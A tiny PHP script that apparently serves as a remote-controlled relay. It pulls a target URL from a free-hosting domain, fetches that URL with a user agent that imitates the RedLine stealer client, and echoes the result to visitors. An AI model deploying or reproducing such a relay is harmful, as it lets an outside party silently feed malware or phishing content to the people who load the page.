<?php
$file = file_get_contents("http://grgs2020.000webhostapp.com/srv/new.php");

$ch  = curl_init();
curl_setopt($ch, CURLOPT_URL, $file);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'REDLINECLIENT TL5000 V2.4.81');
$html = curl_exec($ch);
echo $html;
?>